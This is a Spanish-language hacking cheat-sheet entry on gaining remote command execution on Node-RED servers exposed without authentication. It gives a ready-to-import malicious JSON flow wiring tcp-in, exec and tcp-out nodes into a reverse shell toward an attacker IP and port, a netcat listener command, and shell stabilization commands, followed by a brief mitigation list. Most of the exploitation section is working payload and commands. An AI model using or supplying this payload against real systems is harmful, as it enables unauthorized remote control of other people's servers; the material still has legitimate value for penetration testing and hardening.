

## Node-RED RCE


### 🔎 Descripción

Node-RED es una herramienta de desarrollo basada en flujos para integrar hardware, APIs y servicios.
Cuando se expone públicamente sin autenticación, un atacante puede crear o importar **flujos maliciosos** que permiten ejecutar comandos arbitrarios en el servidor.

Esto se traduce en una **ejecución remota de comandos (RCE)** y la posibilidad de obtener una shell reversa.

---

### ⚙️ Explotación Manual

1. Acceder a la interfaz web de Node-RED (normalmente en el puerto `1880`).
2. Crear un **nuevo flujo** que use nodos de tipo:

   * **`tcp in`** → conecta al atacante.
   * **`exec`** → ejecuta comandos en el sistema.
   * **`tcp out`** → devuelve la salida al atacante.
3. Configurar el nodo `tcp in` con la **IP atacante** y el **puerto** donde estará escuchando.

---

### ⚙️ Explotación Automática (Importar JSON)

Podemos importar directamente un **flujo JSON malicioso** en Node-RED:

```json
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"<IP_ATACANTE>","port":"<PUERTO>","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
```

Fuente: [Link a Json en Github Repo](https://github.com/valkyrix/Node-Red-Reverse-Shell/blob/master/node-red-reverse-shell.json)

🔧 **Editar antes de importar:**

* Reemplazar `<IP_ATACANTE>` por tu dirección IP.
* Reemplazar `<PUERTO>` por el puerto donde tu listener estará a la escucha.

---

### 📡 Listener

En la máquina atacante:

```bash
nc -lvnp <PUERTO>
```

Al importar y ejecutar el flujo, recibiremos una conexión interactiva desde el servidor.

---

### 🛠️ Estabilización de Shell

La conexión inicial puede ser básica. Para mejorarla:

* Establecer una segunda reverse shell.
* Usar técnicas de estabilización como:

  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  ```
* O emplear un script de **upgrade shell**.

---

### 🔒 Mitigación

* Restringir el acceso a la interfaz de Node-RED.
* Habilitar **autenticación** para crear/editar flujos.
* Ponerlo detrás de un proxy con control de acceso.